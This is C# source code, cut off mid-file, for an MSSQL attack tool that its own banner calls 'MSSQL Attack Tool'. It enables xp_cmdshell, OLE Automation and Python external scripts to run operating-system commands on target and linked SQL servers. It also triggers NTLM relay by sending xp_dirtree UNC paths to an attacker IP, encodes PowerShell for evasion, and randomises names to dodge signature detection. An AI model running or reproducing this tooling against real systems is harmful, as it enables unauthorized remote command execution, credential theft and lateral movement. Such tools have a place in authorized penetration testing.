using CommandLine;
using CommandLine.Text;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

/*
M.A.T - MSSQL ATTACK TOOL (Integrated Edition)
Original Author: Marvin Ramsperger (SySS GmbH)
SharpSQLPwn Integration: lefayjey (sp_OACreate, Azure Auth, PS Encoding)
Integrated by: Johto
Copyright (c) 2024
*/

namespace MAT
{
    public class Program
    {
        public static string[] tokens = null;
        public static String serv = null;
        public static String db = "master";
        public static String attackerip = "127.0.0.1";
        public static bool ntlmrelay = false;
        public static string username = null;
        public static string password = "";
        public static bool useusernameandpass = false;
        public static string integratedsecurity = "Integrated Security = True";
        public static bool enablexpcmdshell = false;
        public static bool executexpcmdshellcommand = false;
        public static bool dumphashes = false;
        public static int runmode = 0;
        public static string target = "";
        public static string commandtorun = "";
        public static string usertoimpersonate = "";
        public static string selfservname = "";
        public static bool impersonate = false;
        public static bool executexpcmdshellcommanddoublelink = false;
        public static bool sqlshell = false;
        public static bool stoprox = false;
        public static char[] delims = new[] { '\r', '\n' };
        public static bool help = false;
        public static bool noargs = false;
        public static bool authenticated = false;
        public static String argsconcatinated = "";
        public static bool impersonateduserisadmin = false;
        public static bool RPCOUTenabled = false;

        // New integrated fields
        public static int cmdExecTechnique = 1; // 1=xp_cmdshell, 2=sp_OACreate, 3=CLR assembly, 4=sp_execute_external_script
        public static bool encodePowerShell = false;
        public static string azureDomain = null;
        public static bool useAzureAuth = false;
        public static bool cleanupAfterExec = true;

        // Production enhancement fields
        public static bool spnScan = false;
        public static string outputFile = null;
        public static bool quietMode = false;
        public static int serverPort = 0; // 0 = default
        public static int connectionTimeout = 0; // 0 = default
        public static StreamWriter logWriter = null;
        public static TextWriter originalConsoleOut = null;

        public static void consoletextgreen()
        {
            Console.ForegroundColor = ConsoleColor.Green;
        }

        public static void consoletextwhite()
        {
            Console.ForegroundColor = ConsoleColor.White;
        }
        public static void consoletextyellow()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
        }

        public static void consoletextcyan()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
        }

        public static void consoletextgray()
        {
            Console.ForegroundColor = ConsoleColor.DarkGray;
        }

        public static void consoletextred()
        {
            Console.ForegroundColor = ConsoleColor.Red;
        }

        // --- Output Logging ---

        /// <summary>
        /// Initialize output file logging (tee to both console and file).
        /// </summary>
        public static void InitializeLogging(string filePath)
        {
            try
            {
                logWriter = new StreamWriter(filePath, append: true, encoding: Encoding.UTF8);
                logWriter.AutoFlush = true;
                originalConsoleOut = Console.Out;
                Console.SetOut(new TeeTextWriter(originalConsoleOut, logWriter));
                Console.WriteLine("[*] Logging output to: " + filePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to initialize log file: " + ex.Message);
            }
        }

        /// <summary>
        /// Close log file and restore console output.
        /// </summary>
        public static void FinalizeLogging()
        {
            if (logWriter != null)
            {
                try
                {
                    if (originalConsoleOut != null) Console.SetOut(originalConsoleOut);
                    logWriter.Close();
                }
                catch { }
            }
        }

        /// <summary>
        /// TextWriter that writes to two outputs simultaneously (console + file).
        /// </summary>
        public class TeeTextWriter : TextWriter
        {
            private readonly TextWriter _console;
            private readonly TextWriter _file;

            public TeeTextWriter(TextWriter console, TextWriter file)
            {
                _console = console;
                _file = file;
            }

            public override Encoding Encoding => _console.Encoding;

            public override void Write(char value)
            {
                _console.Write(value);
                _file.Write(value);
            }

            public override void Write(string value)
            {
                _console.Write(value);
                _file.Write(value);
            }

            public override void WriteLine(string value)
            {
                _console.WriteLine(value);
                _file.WriteLine(value);
            }

            public override void Flush()
            {
                _console.Flush();
                _file.Flush();
            }
        }

        // --- OPSEC: Random Name Generator ---

        /// <summary>
        /// Generate a random alphanumeric name for CLR assembly/procedure to avoid signature detection.
        /// </summary>
        public static string GenerateRandomName(int length = 8)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            var random = new Random();
            var sb = new StringBuilder(length);
            for (int i = 0; i < length; i++)
            {
                sb.Append(chars[random.Next(chars.Length)]);
            }
            return sb.ToString();
        }

        // --- SPN Discovery ---

        /// <summary>
        /// Discover MSSQL instances in the current AD domain via SPN enumeration.
        /// Ported from SharpSQL's Get-SQLInstanceDomain.
        /// </summary>
        public static void DiscoverSQLInstances()
        {
            Console.WriteLine("################ SPN Discovery - MSSQL Instances ######################");
            List<string> spnList = new List<string>();

            try
            {
                // Search Computer SPNs
                using (var context = new PrincipalContext(ContextType.Domain))
                {
                    using (var searcher = new PrincipalSearcher(new ComputerPrincipal(context)))
                    {
                        foreach (var result in searcher.FindAll())
                        {
                            DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;
                            if (de == null) continue;
                            foreach (string spn in de.Properties["serviceprincipalname"])
                            {
                                if (Regex.IsMatch(spn, "MSSQL", RegexOptions.IgnoreCase))
                                {
                                    spnList.Add(spn);
                                }
                            }
                        }
                    }
                }

                // Search User SPNs
                using (var context = new PrincipalContext(ContextType.Domain))
                {
                    using (var searcher = new PrincipalSearcher(new UserPrincipal(context)))
                    {
                        foreach (var result in searcher.FindAll())
                        {
                            DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;
                            if (de == null) continue;
                            foreach (string spn in de.Properties["serviceprincipalname"])
                            {
                                if (Regex.IsMatch(spn, "MSSQL", RegexOptions.IgnoreCase))
                                {
                                    spnList.Add(spn);
                                }
                            }
                        }
                    }
                }

                if (spnList.Count > 0)
                {
                    consoletextgreen();
                    Console.WriteLine("[+] Found " + spnList.Count + " MSSQL SPN(s):");
                    consoletextwhite();
                    foreach (string spn in spnList)
                    {
                        Console.WriteLine("    " + spn);
                    }
                }
                else
                {
                    Console.WriteLine("[-] No MSSQL SPNs found in the current domain.");
                }
            }
            catch (PrincipalServerDownException)
            {
                consoletextred();
                Console.WriteLine("[-] Domain controller unreachable. Are you domain-joined?");
                consoletextwhite();
            }
            catch (Exception ex)
            {
                consoletextred();
                Console.WriteLine("[-] SPN discovery error: " + ex.Message);
                consoletextwhite();
            }
            Console.WriteLine("######################################################################");
        }

        // --- sp_execute_external_script (technique 4) ---

        /// <summary>
        /// Execute OS command via sp_execute_external_script with Python.
        /// Requires Machine Learning Services (Python) installed on the SQL Server.
        /// </summary>
        public static void ExecuteExternalScript(string command, SqlConnection con)
        {
            Console.WriteLine("[*] Executing via sp_execute_external_script (Python)...");
            string cmd = PrepareCommand(command);

            try
            {
                consoletextcyan();
                Console.WriteLine("[*] Enabling external scripts configuration...");
                consoletextwhite();
                string enableExtScript = "EXEC sp_configure 'external scripts enabled', 1; RECONFIGURE;";
                executeQuery(enableExtScript, con);

                consoletextgreen();
                Console.WriteLine("[+] Executing command:");
                consoletextwhite();
                string execScript = "EXEC sp_execute_external_script @language=N'Python', @script=N'import subprocess; result = subprocess.run(\"" + EscapeSql(cmd).Replace("\"", "\\\"") + "\", shell=True, capture_output=True, text=True); print(result.stdout); print(result.stderr);';";
                string res = executeQuery(execScript, con);
                Console.WriteLine(res);

                if (cleanupAfterExec)
                {
                    consoletextcyan();
                    Console.WriteLine("[*] Cleanup: Disabling external scripts...");
                    consoletextwhite();
                    string disableExtScript = "EXEC sp_configure 'external scripts enabled', 0; RECONFIGURE;";
                    executeQuery(disableExtScript, con);
                }
            }
            catch (Exception ex)
            {
                consoletextred();
                Console.WriteLine("[-] Error executing via external script: " + ex.Message);
                Console.WriteLine("[i] Requires Machine Learning Services (Python) installed on the SQL Server.");
                consoletextwhite();
            }
        }

        /// <summary>
        /// Execute OS command via sp_execute_external_script on a linked server.
        /// </summary>
        public static void ExecuteExternalScriptLinked(string command, string linkedServer, SqlConnection con)
        {
            Console.WriteLine("[*] Executing via sp_execute_external_script on linked server " + linkedServer + "...");
            string cmd = PrepareCommand(command);

            try
            {
                string enableExtScript = "EXEC ('sp_configure ''external scripts enabled'', 1; RECONFIGURE;') AT [" + linkedServer + "];";
                executeQuery(enableExtScript, con);

                consoletextgreen();
                Console.WriteLine("[+] Executing command on " + linkedServer + ":");
                consoletextwhite();
                string escapedCmd = EscapeSql(EscapeSql(cmd)).Replace("\"", "\\\"");
                string execScript = "EXEC ('sp_execute_external_script @language=N''Python'', @script=N''import subprocess; result = subprocess.run(\"" + escapedCmd + "\", shell=True, capture_output=True, text=True); print(result.stdout); print(result.stderr);'';') AT [" + linkedServer + "];";
                string res = executeQuery(execScript, con);
                Console.WriteLine(res);

                if (cleanupAfterExec)
                {
                    consoletextcyan();
                    Console.WriteLine("[*] Cleanup: Disabling external scripts on " + linkedServer + "...");
                    consoletextwhite();
                    string disableExtScript = "EXEC ('sp_configure ''external scripts enabled'', 0; RECONFIGURE;') AT [" + linkedServer + "];";
                    executeQuery(disableExtScript, con);
                }
            }
            catch (Exception ex)
            {
                consoletextred();
                Console.WriteLine("[-] Error executing external script on linked server: " + ex.Message);
                consoletextwhite();
            }
        }

        // --- Core Query Execution ---

        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }

        /// <summary>
        /// Execute query with multi-column output (from SharpSQLPwn CustomQuerySQL)
        /// </summary>
        public static String executeQueryMultiColumn(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                StringBuilder sb = new StringBuilder();

                // Print column headers
                int hyphenCount = 0;
                for (int i = 0; i < reader.FieldCount; i++)
                {
                    string colName = reader.GetName(i) + " | ";
                    sb.Append(colName);
                    hyphenCount += colName.Length;
                }
                sb.AppendLine();
                sb.AppendLine(new String('-', hyphenCount));

                while (reader.Read())
                {
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        sb.Append(reader.GetValue(i) + " | ");
                    }
                    sb.AppendLine();
                }

                reader.Close();
                return sb.ToString();
            }
            catch
            {
                reader.Close();
                return "";
            }
        }

        // --- PowerShell Base64 Encoding (from SharpSQLPwn) ---

        /// <summary>
        /// Encode a command as base64 PowerShell (-enc) for evasion.
        /// </summary>
        public static string EncodePowerShell(string command)
        {
            byte[] psCommandBytes = Encoding.Unicode.GetBytes(command);
            string psCommandBase64 = Convert.ToBase64String(psCommandBytes);
            string encoded = "powershell -enc " + psCommandBase64;

            consoletextcyan();
            Console.WriteLine("[i] Original command: " + command);
            Console.WriteLine("[i] Encoded command: " + encoded);
            consoletextwhite();

            return encoded;
        }

        /// <summary>
        /// Optionally encode command if --encode-ps flag is set.
        /// </summary>
        public static string PrepareCommand(string command)
        {
            if (encodePowerShell)
            {
                return EncodePowerShell(command);
            }
            return command;
        }

        // --- Sanitization ---

        /// <summary>
        /// Escape single quotes for SQL string concatenation.
        /// </summary>
        public static string EscapeSql(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            return input.Replace("'", "''");
        }

        // --- Role & Permission Checks ---

        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{EscapeSql(groupToCheck)}');", con);
            int role = int.Parse(res);
            if (role == 1)
            {
                if (groupToCheck.Equals("sysadmin"))
                {
                    consoletextyellow();
                    Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group. (Pwn3d!)");
                    consoletextwhite();
                }
                else
                {
                    Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
                }
            }
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
            }
        }

        public static bool currentuserisadmin(SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('sysadmin');", con);
            int role = int.Parse(res);
            if (role == 1)
            {
                return true;
            }
            return false;
        }

        // --- RPC OUT Management ---

        public static bool isRPCOUTenabled(String target, SqlConnection con)
        {
            String strtocheckRPCOUT = "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '" + EscapeSql(target) + "';";
            String s = executeQuery(strtocheckRPCOUT, con);
            if (s.Contains("True")) { return true; }
            else { return false; }
        }

        public static void enableRPCOUT(String target, SqlConnection con)
        {
            String strtoenableRPCOUT = "EXEC sp_serveroption '" + EscapeSql(target) + "', 'rpc out', 'true';";
            try { String run = executeQuery(strtoenableRPCOUT, con); }
            catch (Exception e2) { Console.WriteLine("[-] Error while enabling RPC OUT - Missing permissions"); }
        }

        /// <summary>
        /// Enable both rpc and rpc out on linked server (from SharpSQLPwn).
        /// </summary>
        public static void enableRPCFull(String target, SqlConnection con)
        {
            String enableRpc = "EXEC sp_serveroption '" + EscapeSql(target) + "', 'rpc', 'true'; EXEC sp_serveroption '" + EscapeSql(target) + "', 'rpc out', 'true';";
            try { executeQuery(enableRpc, con); }
            catch (Exception e2) { Console.WriteLine("[-] Error while enabling RPC/RPC OUT - Missing permissions"); }
        }

        public static bool isRPCOUTenabledlinkedserver(String lserver, String selfname, SqlConnection con)
        {
            String res = "False";
            res = executeQuery("EXEC ('SELECT is_rpc_out_enabled FROM sys.servers WHERE name = ''" + EscapeSql(selfname) + "'';') AT [" + lserver + "];", con);

            if (res.Contains("True")) { return true; }
            else { return false; }
        }

        public static void enableRPCOUTlinkedserver(String lserver, String selfname, SqlConnection con)
        {
            try
            {
                String res = executeQuery("EXEC ('EXEC sp_serveroption ''" + EscapeSql(selfname) + "'', ''rpc out'', ''true'';') AT [" + lserver + "];", con);
            }
            catch (Exception e2) { }
        }

        // --- xp_cmdshell Management ---

        public static int isxpcmdshelllocallyenabled(SqlConnection con)
        {
            try
            {
                String res = executeQuery("SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE  name = 'xp_cmdshell';", con);
                return Int32.Parse(res.ToString());
            }
            catch (Exception e2) { return 2; }
        }

        public static int enablexpcmdshelllocallyandcheck(SqlConnection con)
        {
            try
            {
                String res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
                res = executeQuery("SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE  name = 'xp_cmdshell';", con);
                return Int32.Parse(res.ToString());
            }
            catch (Exception e2) { return 2; }
        }

        /// <summary>
        /// Disable xp_cmdshell after use (cleanup, from SharpSQLPwn).
        /// </summary>
        public static void disablexpcmdshelllocally(SqlConnection con)
        {
            try
            {
                executeQuery("EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;", con);
                consoletextcyan();
                Console.WriteLine("[*] Cleanup: xp_cmdshell disabled locally");
                consoletextwhite();
            }
            catch { }
        }

        public static int isxpcmdshellonlserverenabled(String target, SqlConnection con)
        {
            try
            {
                String res = executeQuery("EXEC('SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM  sys.configurations WHERE  name = ''xp_cmdshell'';')AT [" + target + "];", con);
                return Int32.Parse(res.ToString());
            }
            catch (Exception e2) { return 2; }
        }

        public static int enablexpcmdshelllserverandcheck(String target, SqlConnection con)
        {
            try
            {
                String res = executeQuery("EXEC('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')AT [" + target + "];", con);
                res = executeQuery("EXEC('SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM  sys.configurations WHERE  name = ''xp_cmdshell'';')AT [" + target + "];", con);
                return Int32.Parse(res.ToString());
            }
            catch (Exception e2) { return 2; }
        }

        // --- sp_OACreate (OLE Automation) - from SharpSQLPwn technique 2 ---

        /// <summary>
        /// Execute OS command via sp_OACreate (OLE Automation Procedures) locally.
        /// Note: This method does NOT return command output (blind execution).
        /// </summary>
        public static void ExecuteOleAutomation(string command, SqlConnection con)
        {
            Console.WriteLine("[*] Executing via sp_OACreate (OLE Automation Procedures)...");
            string cmd = PrepareCommand(command);

            try
            {
                consoletextcyan();
                Console.WriteLine("[*] Enabling Ole Automation Procedures...");
                consoletextwhite();
                string enableOle = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                executeQuery(enableOle, con);

                consoletextgreen();
                Console.WriteLine("[+] Executing command (blind - no output returned):");
                consoletextwhite();
                string execOle = "DECLARE @myshell INT; EXEC sp_OACreate 'wscript.shell', @myshell OUTPUT; EXEC sp_OAMethod @myshell, 'run', null, '" + EscapeSql(cmd) + "';";
                executeQuery(execOle, con);
                Console.WriteLine("[+] Command executed via OLE Automation");

                if (cleanupAfterExec)
                {
                    consoletextcyan();
                    Console.WriteLine("[*] Cleanup: Disabling Ole Automation Procedures...");
                    consoletextwhite();
                    string disableOle = "EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
                    executeQuery(disableOle, con);
                }
            }
            catch (Exception ex)
            {
                consoletextred();
                Console.WriteLine("[-] Error executing via OLE Automation: " + ex.Message);
                consoletextwhite();
            }
        }

        /// <summary>
        /// Execute OS command via sp_OACreate on a linked server.
        /// </summary>
        public static void ExecuteOleAutomationLinked(string command, string linkedServer, SqlConnection con)
        {
            Console.WriteLine("[*] Executing via sp_OACreate on linked server " + linkedServer + "...");
            string cmd = PrepareCommand(command);

            try
            {
                string enableOle = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + linkedServer + "]; EXEC ('sp_configure ''Ole Automation Procedures'', 1; reconfigure;') AT [" + linkedServer + "];";
                executeQuery(enableOle, con);

                consoletextgreen();
                Console.WriteLine("[+] Executing command on " + linkedServer + " (blind - no output returned):");
                consoletextwhite();
                string execOle = "EXEC ('DECLARE @myshell INT; EXEC sp_OACreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_OAMethod @myshell, ''run'', null, ''" + EscapeSql(EscapeSql(cmd)) + "'';') AT [" + linkedServer + "];";
                executeQuery(execOle, con);
                Console.WriteLine("[+] Command executed via OLE Automation on " + linkedServer);

                if (cleanupAfterExec)
                {
                    consoletextcyan();
                    Console.WriteLine("[*] Cleanup: Disabling Ole Automation Procedures on " + linkedServer + "...");
                    consoletextwhite();
                    string disableOle = "EXEC ('sp_configure ''Ole Automation Procedures'', 0; reconfigure; sp_configure ''show advanced options'', 0; reconfigure;') AT [" + linkedServer + "];";
                    executeQuery(disableOle, con);
                }
            }
            catch (Exception ex)
            {
                consoletextred();
                Console.WriteLine("[-] Error executing OLE Automation on linked server: " + ex.Message);
                consoletextwhite();
            }
        }

        // --- UNC Path Injection on Linked Server (from SharpSQLPwn) ---

        /// <summary>
        /// Trigger NTLM authentication from a linked server to attacker IP.
        /// </summary>
        public static void UNCPathInjectionLinked(string linkedServer, string smbIp, SqlConnection con)
        {
            Console.WriteLine("[*] Triggering UNC path injection on " + linkedServer + " to " + smbIp + "...");
            try
            {
                string smbquery = "EXEC ('master..xp_dirtree ''\\\\" + EscapeSql(smbIp) + "\\test'';') AT [" + linkedServer + "]";
                executeQuery(smbquery, con);
                consoletextgreen();
                Console.WriteLine("[+] UNC path injection triggered on " + linkedServer + ". Check Responder/ntlmrelayx.");
                consoletextwhite();
            }
            catch (Exception ex)
            {
                consoletextred();
                Console.WriteLine("[-] Error triggering UNC on linked server: " + ex.Message);
                consoletextwhite();
            }
        }

        // --- CLI Options ---

        public class Options
        {
            [Option('s', "server", Required = false, HelpText = "SQL server")]
            public String Server { get; set; }

            [Option('u', "user", Required = false, HelpText = "SQL user")]
            public String User { get; set; }

            [Option('p', "password", Required = false, HelpText = "SQL password")]
            public String Password { get; set; }

            [Option('d', "database", Required = false, HelpText = "Database name (default: 'master')")]
            public String Database { get; set; }

            [Option('r', "relay", Required = false, HelpText = "Trigger an NTLM-relay to the given IP via XP_DIRTREE (works with -l for linked server)")]
            public String Relay { get; set; }

            [Option('i', "impersonate", Required = false, HelpText = "Impersonate the specified SQL user")]
            public String Impersonate { get; set; }

            [Option(Required = false, HelpText = "Dump MSSQL user hashes if the current user has admin permissions")]
            public bool DumpHashes { get; set; }

            [Option('l', "linked-server", Required = false, HelpText = "Linked SQL server")]
            public String LinkedServer { get; set; }

            [Option('e', Required = false, HelpText = "Enable XP_CMD Shell locally '-e' or on linked server '-e -l LINKEDSERVER'")]
            public bool XP_CMD { get; set; }

            [Option("os-command", Required = false, HelpText = "OS command to execute on selected target system")]
            public String OS_Command { get; set; }

            [Option("sql-command", Required = false, HelpText = "SQL command to execute on selected target system")]
            public String SQL_Command { get; set; }

            [Option("double-link", Required = false, HelpText = "Execute OS command via XP_CMD shell using double link")]
            public String DoubleLink { get; set; }

            [Option(Required = false, HelpText = "Execute OS command via custom assembly stored procedure")]
            public String StoProx { get; set; }

            // --- New integrated options from SharpSQLPwn ---

            [Option("cmdtech", Required = false, Default = 1, HelpText = "Command execution technique: 1=xp_cmdshell (default), 2=sp_OACreate, 3=CLR assembly")]
            public int CmdTech { get; set; }

            [Option("encode-ps", Required = false, HelpText = "Encode command as base64 PowerShell (-enc) for evasion")]
            public bool EncodePS { get; set; }

            [Option("azure-domain", Required = false, HelpText = "Azure AD domain (enables Azure authentication, requires -u and -p)")]
            public String AzureDomain { get; set; }

            [Option("no-cleanup", Required = false, HelpText = "Skip cleanup (don't disable features after execution)")]
            public bool NoCleanup { get; set; }

            [Option("linked-query", Required = false, HelpText = "Execute custom SQL query on linked server via OPENQUERY")]
            public String LinkedQuery { get; set; }

            // --- Production enhancement options ---

            [Option("spn-scan", Required = false, HelpText = "Discover MSSQL instances in the domain via SPN enumeration (no -s required)")]
            public bool SpnScan { get; set; }

            [Option("output", Required = false, HelpText = "Log all output to file (for engagement evidence)")]
            public String Output { get; set; }

            [Option("quiet", Required = false, HelpText = "Suppress banner and informational messages")]
            public bool Quiet { get; set; }

            [Option("port", Required = false, Default = 0, HelpText = "SQL Server port (default: 1433). Useful for tunneled/proxied connections")]
            public int Port { get; set; }

            [Option("timeout", Required = false, Default = 0, HelpText = "Connection timeout in seconds (default: 30). Useful for high-latency links")]
            public int Timeout { get; set; }

            [Usage(ApplicationAlias = "MAT.exe")]
            public static IEnumerable<Example> Examples
            {
                get
                {
                    return new List<Example>() {
                        new Example("Discover MSSQL instances in domain", new Options { SpnScan = true }),
                        new Example("Execute OS command via xp_cmdshell", new Options { Server = "localhost", OS_Command = "whoami" }),
                        new Example("Execute via OLE Automation on linked server", new Options { Server = "localhost", LinkedServer = "LINKED01", OS_Command = "whoami", CmdTech = 2 }),
                        new Example("Execute via external Python script", new Options { Server = "localhost", OS_Command = "whoami", CmdTech = 4 }),
                        new Example("Execute with PowerShell encoding", new Options { Server = "localhost", OS_Command = "whoami", EncodePS = true }),
                        new Example("UNC relay on linked server", new Options { Server = "localhost", LinkedServer = "LINKED01", Relay = "10.10.10.10" }),
                        new Example("Log output to file", new Options { Server = "localhost", OS_Command = "whoami", Output = "engagement.log" }),
                        new Example("Connect via non-standard port with timeout", new Options { Server = "10.10.10.5", Port = 1434, Timeout = 60 }),
                    };
                }
            }
        }

        public static void Main(string[] args)
        {
            // Track linked query separately
            string linkedQuery = null;

            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
            {
                // server
                if (o.Server != null) { serv = o.Server; }

                // user
                if (o.User != null)
                {
                    username = o.User;
                    useusernameandpass = true;
                    integratedsecurity = "Integrated Security = False;";
                }

                // password
                if (o.Password != null) { password = o.Password; }

                // database
                if (o.Database != null) { db = o.Database; }

                // relay
                if (o.Relay != null)
                {
                    attackerip = o.Relay;
                    ntlmrelay = true;
                }

                // user impersonation
                if (o.Impersonate != null)
                {
                    usertoimpersonate = o.Impersonate;
                    impersonate = true;
                }

                // dump hashes
                if (o.DumpHashes) { dumphashes = true; }

                // enable XP_CMD shell
                if (o.XP_CMD) { enablexpcmdshell = true; }

                if (o.LinkedServer != null)
                {
                    target = o.LinkedServer;
                    runmode = 1;
                }

                // OS command execution
                if (o.OS_Command != null)
                {
                    if (o.DoubleLink != null)
                    {
                        executexpcmdshellcommanddoublelink = true;
                        target = o.DoubleLink;
                    }
                    else
                    {
                        executexpcmdshellcommand = true;
                    }
                    commandtorun = o.OS_Command;
                }
                else if (o.SQL_Command != null)
                {
                    sqlshell = true;
                    commandtorun = o.SQL_Command;
                }
                else if (o.StoProx != null)
                {
                    stoprox = true;
                    commandtorun = o.StoProx;
                }

                // New integrated options
                cmdExecTechnique = o.CmdTech;
                encodePowerShell = o.EncodePS;
                cleanupAfterExec = !o.NoCleanup;

                if (o.AzureDomain != null)
                {
                    azureDomain = o.AzureDomain;
                    useAzureAuth = true;
                }

                if (o.LinkedQuery != null)
                {
                    linkedQuery = o.LinkedQuery;
                }

                // Production enhancement options
                spnScan = o.SpnScan;
                if (o.Output != null) { outputFile = o.Output; }
                quietMode = o.Quiet;
                serverPort = o.Port;
                connectionTimeout = o.Timeout;
            });

            // Initialize output logging if requested
            if (outputFile != null)
            {
                InitializeLogging(outputFile);
            }

            // Handle SPN scan mode (no server required)
            if (spnScan)
            {
                if (!quietMode)
                {
                    Console.WriteLine(@"  __  __      _     _____   ");
                    Console.WriteLine(@" |  \/  |    / \   |_   _|  ");
                    Console.WriteLine(@" | |\/| |   / _ \    | |    ");
                    Console.WriteLine(@" | |  | |  / ___ \   | |    ");
                    Console.WriteLine(@" |_|  |_| /_/   \_\  |_|    ");
                    Console.WriteLine(@"  MSSQL Attack Tool - Integrated Edition");
                    Console.WriteLine();
                }
                DiscoverSQLInstances();
                if (serv == null) { FinalizeLogging(); Environment.Exit(0); }
            }

            // check if all required arguments were provided
            if (serv == null)
            {
                Console.WriteLine("[-] Error: --server (-s) is required. Use --spn-scan for domain discovery without a server.");
                FinalizeLogging();
                Environment.Exit(1);
            }

            if (!quietMode)
            {
                Console.WriteLine(@"  __  __      _     _____   ");
                Console.WriteLine(@" |  \/  |    / \   |_   _|  ");
                Console.WriteLine(@" | |\/| |   / _ \    | |    ");
                Console.WriteLine(@" | |  | |  / ___ \   | |    ");
                Console.WriteLine(@" |_|  |_| /_/   \_\  |_|    ");
                Console.WriteLine(@"  MSSQL Attack Tool - Integrated Edition");
                Console.WriteLine(@"  Techniques: xp_cmdshell | sp_OACreate | CLR Assembly | External Script");
                Console.WriteLine();
            }

            Console.WriteLine("[*] Selected server  : " + serv);
            Console.WriteLine("[*] Selected database: " + db);
            if (serverPort > 0) { Console.WriteLine("[*] Custom port: " + serverPort); }
            if (connectionTimeout > 0) { Console.WriteLine("[*] Connection timeout: " + connectionTimeout + "s"); }
            if (ntlmrelay == true) { Console.WriteLine("[*] NTLM relay option enabled - Attacker IP: " + attackerip); }
            if (encodePowerShell) { Console.WriteLine("[*] PowerShell base64 encoding enabled"); }
            string[] techNames = { "", "xp_cmdshell", "sp_OACreate", "CLR Assembly", "External Script (Python)" };
            Console.WriteLine("[*] Execution technique: " + (cmdExecTechnique >= 1 && cmdExecTechnique <= 4 ? techNames[cmdExecTechnique] : "unknown"));

            // --- Authentication ---
            // Build server string with optional port
            string serverStr = serv;
            if (serverPort > 0) { serverStr = serv + "," + serverPort; }

            // Build timeout string
            string timeoutStr = "";
            if (connectionTimeout > 0) { timeoutStr = ";Connect Timeout=" + connectionTimeout; }

            String conStr = "";
            if (useAzureAuth && username != null && password != null && azureDomain != null)
            {
                // Azure authentication (from SharpSQLPwn)
                string azureUser = username + "@" + azureDomain;
                conStr = "Server = " + serverStr + "; Database = " + db + "; Authentication=Active Directory Password; TrustServerCertificate=True; user id=" + azureUser + "; password=" + password + ";" + timeoutStr;
                consoletextcyan();
                Console.WriteLine("[*] Azure Authentication Selected");
                consoletextwhite();
            }
            else if (useusernameandpass == true)
            {
                conStr = "Server = " + serverStr + "; Database = " + db + ";" + integratedsecurity + ";User ID=" + username + ";Password=" + password + timeoutStr;
            }
            else
            {
                conStr = "Server = " + serverStr + "; Database = " + db + ";" + integratedsecurity + timeoutStr;
            }

            SqlConnection con = new SqlConnection(conStr);

            try
            {
                con.Open();
                Console.Write("[+] Authenticated to MSSQL Server ");
                Console.Write(executeQuery($"SELECT @@SERVERNAME;", con));
                authenticated = true;
            }
            catch (Exception ex)
            {
                consoletextred();
                Console.WriteLine("[-] Authentication failed: " + ex.Message);
                consoletextwhite();
            }

            if (authenticated == true)
            {
                String su = "";

                // ====================== RECON ======================
                String login = executeQuery("SELECT SYSTEM_USER;", con);
                Console.WriteLine("[*] Logged in as: " + login.Replace("\n", "").Replace("\r", ""));
                String uname = executeQuery("SELECT USER_NAME();", con);
                Console.WriteLine($"[*] Database username: " + uname.Replace("\n", "").Replace("\r", ""));
                getGroupMembership("public", con);
                getGroupMembership("sysadmin", con);
                Console.Write("[i] XP_cmdshell enabled: "); if (isxpcmdshelllocallyenabled(con) == 0) { Console.WriteLine("False"); } else { Console.WriteLine("True"); }

                // ====================== IMPERSONATION ENUM (improved from SharpSQLPwn) ======================
                Console.WriteLine("################ Impersonation privileges ##############################");

                String res = "";

                // NTLM relay (local)
                if (ntlmrelay == true && runmode == 0)
                {
                    Console.WriteLine("################################# NTLM RELAYING #######################");
                    Console.WriteLine("[*] Triggering NTLM relay to " + attackerip + "...");
                    Console.WriteLine("#######################################################################");
                    try
                    {
                        String query = "EXEC master..xp_dirtree \"\\\\" + EscapeSql(attackerip) + "\\\\test\";";
                        SqlCommand command = new SqlCommand(query, con);
                        SqlDataReader reader = command.ExecuteReader();
                        reader.Close();
                        consoletextgreen();
                        Console.WriteLine("[+] UNC path injection triggered. Check Responder/ntlmrelayx.");
                        consoletextwhite();
                    }
                    catch (Exception ex) { }
                }

                // NTLM relay on linked server (from SharpSQLPwn)
